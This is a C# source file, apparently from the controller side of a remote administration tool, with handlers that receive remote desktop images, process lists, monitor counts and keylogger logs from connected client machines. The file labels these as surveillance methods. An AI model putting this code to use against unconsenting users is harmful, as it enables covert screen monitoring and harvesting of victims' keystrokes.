using System.Drawing;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using xServer.Core.Helper;
using xServer.Core.Packets.ClientPackets;

namespace xServer.Core.Commands
{
    /* THIS PARTIAL CLASS SHOULD CONTAIN METHODS THAT ARE USED FOR SURVEILLANCE. */
    public static partial class CommandHandler
    {
        public static void HandleRemoteDesktopResponse(Client client, DesktopResponse packet)
        {
            if (client.Value.FrmRdp == null)
                return;

            if (packet.Image == null)
            {
                if (client.Value.FrmRdp != null)
                    client.Value.FrmRdp.UpdateImage(client.Value.LastDesktop);

                client.Value.LastDesktop = null;
                client.Value.LastDesktopSeen = true;

                return;
            }

            // we can not dispose all bitmaps here, cause they are later used again in `client.Value.LastDesktop`
            if (client.Value.LastDesktop == null)
            {
                if (client.Value.StreamCodec != null)
                {
                    client.Value.StreamCodec.Dispose();
                }

                client.Value.StreamCodec = new UnsafeStreamCodec();
                if (client.Value.LastQuality != packet.Quality || client.Value.LastMonitor != packet.Monitor)
                {
                    client.Value.LastQuality = packet.Quality;
                    client.Value.LastMonitor = packet.Monitor;
                }

                using (MemoryStream ms = new MemoryStream(packet.Image))
                {
                    Bitmap newScreen = client.Value.StreamCodec.DecodeData(ms);

                    client.Value.LastDesktop = newScreen;

                    if (client.Value.FrmRdp != null)
                        client.Value.FrmRdp.UpdateImage((Bitmap)newScreen.Clone());

                    newScreen = null;
                }
            }
            else
            {
                using (MemoryStream ms = new MemoryStream(packet.Image))
                {
                    lock (client.Value.StreamCodec)
                    {
                        if (client.Value.LastQuality != packet.Quality || client.Value.LastMonitor != packet.Monitor)
                        {
                            if (client.Value.StreamCodec != null)
                            {
                                client.Value.StreamCodec.Dispose();
                            }

                            client.Value.StreamCodec = new UnsafeStreamCodec();
                            client.Value.LastQuality = packet.Quality;
                            client.Value.LastMonitor = packet.Monitor;
                        }

                        Bitmap newScreen = client.Value.StreamCodec.DecodeData(ms);

                        client.Value.LastDesktop = newScreen;

                        if (client.Value.FrmRdp != null)
                            client.Value.FrmRdp.UpdateImage((Bitmap)newScreen.Clone());

                        newScreen = null;
                    }
                }
            }

            packet.Image = null;
            client.Value.LastDesktopSeen = true;
        }

        public static void HandleGetProcessesResponse(Client client, GetProcessesResponse packet)
        {
            if (client.Value.FrmTm == null)
                return;

            client.Value.FrmTm.ClearListview();

            // None of the arrays containing the process' information can be null.
            // The must also be the exact same length because each entry in the three
            // different arrays represents one process.
            if (packet.Processes == null || packet.IDs == null || packet.Titles == null ||
                packet.Processes.Length != packet.IDs.Length || packet.Processes.Length != packet.Titles.Length)
                return;

            new Thread(() =>
            {
                for (int i = 0; i < packet.Processes.Length; i++)
                {
                    if (packet.IDs[i] != 0 && packet.Processes[i] != "System.exe")
                    {
                        if (client.Value.FrmTm == null)
                            break;

                        ListViewItem lvi =
                            new ListViewItem(new string[] { packet.Processes[i], packet.IDs[i].ToString(), packet.Titles[i] });

                        client.Value.FrmTm.AddProcessToListview(lvi);
                    }
                }
            }).Start();
        }

        public static void HandleGetLogsResponse(Client client, GetLogsResponse packet)
        {
            if (client.Value.FrmKl == null)
                return;

            if (packet.FileCount == 0)
            {
                client.Value.FrmKl.SetGetLogsEnabled(true);

                return;
            }

            string downloadPath = Path.Combine(client.Value.DownloadDirectory, "Logs\\");

            if (string.IsNullOrEmpty(packet.Filename))
                return;

            if (!Directory.Exists(downloadPath))
                Directory.CreateDirectory(downloadPath);

            downloadPath = Path.Combine(downloadPath, packet.Filename + ".html");

            FileSplit destFile = new FileSplit(downloadPath);

            destFile.AppendBlock(packet.Block, packet.CurrentBlock);

            if (packet.Index == packet.FileCount && (packet.CurrentBlock + 1) == packet.MaxBlocks)
            {
                FileInfo[] iFiles = new DirectoryInfo(Path.Combine(client.Value.DownloadDirectory, "Logs\\")).GetFiles();

                if (iFiles.Length == 0)
                    return;

                foreach (FileInfo file in iFiles)
                {
                    if (client.Value.FrmKl == null)
                        break;

                    client.Value.FrmKl.AddLogToListview(file.Name);
                }

                if (client.Value.FrmKl == null)
                    return;

                client.Value.FrmKl.SetGetLogsEnabled(true);
            }
        }

        public static void HandleMonitorsResponse(Client client, MonitorsResponse packet)
        {
            if (client.Value.FrmRdp == null)
                return;

            client.Value.FrmRdp.AddMonitors(packet.Number);
        }
    }
}